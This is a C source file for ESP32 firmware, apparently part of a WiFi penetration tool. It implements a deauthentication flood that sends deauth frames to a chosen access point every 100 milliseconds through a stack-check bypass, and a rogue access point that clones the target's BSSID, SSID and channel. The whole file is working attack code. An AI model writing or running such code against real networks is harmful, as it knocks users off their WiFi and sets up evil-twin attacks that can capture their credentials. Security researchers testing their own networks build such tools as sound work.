#include "attack_method.h"
#include "attack.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "wsl_bypasser.h"
#include "wifi_controller.h"
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>

static const char *TAG = "attack_method";
static esp_timer_handle_t deauth_timer = NULL;
static wifi_ap_record_t current_target;

static void timer_send_deauth(void *arg) {
    wifi_ap_record_t *ap = (wifi_ap_record_t *)arg;
    esp_err_t err = esp_wifi_set_channel(ap->primary, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) return;
    wsl_bypasser_send_deauth_frame(ap);
}

void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_sec) {
    (void)period_sec;
    memcpy(&current_target, ap_record, sizeof(wifi_ap_record_t));
    esp_wifi_set_ps(WIFI_PS_NONE);
    
    if (deauth_timer) {
        esp_timer_stop(deauth_timer);
        esp_timer_delete(deauth_timer);
    }
    
    esp_timer_create_args_t args = {
        .callback = &timer_send_deauth,
        .arg = &current_target,
        .name = "deauth_timer"
    };
    ESP_ERROR_CHECK(esp_timer_create(&args, &deauth_timer));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer, 100000)); // 100ms
    ESP_LOGI(TAG, "Deauth timer started for %s", ap_record->ssid);
}

void attack_method_broadcast_stop(void) {
    if (deauth_timer) {
        esp_timer_stop(deauth_timer);
        esp_timer_delete(deauth_timer);
        deauth_timer = NULL;
    }
    ESP_LOGI(TAG, "Deauth broadcast stopped");
}

void attack_method_rogueap(const wifi_ap_record_t *ap_record) {
    wifictl_set_ap_mac(ap_record->bssid);
    
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = WIFI_AUTH_WPA2_PSK,
            .password = "dummypassword",
            .max_connection = 4,
        },
    };
    memcpy(ap_config.ap.ssid, ap_record->ssid, 32);
    wifictl_ap_start(&ap_config);
    ESP_LOGI(TAG, "Rogue AP created: %s (CH %d)", ap_record->ssid, ap_record->primary);
}

void attack_method_deauth_all_stop(void) {
    attack_method_broadcast_stop();
}
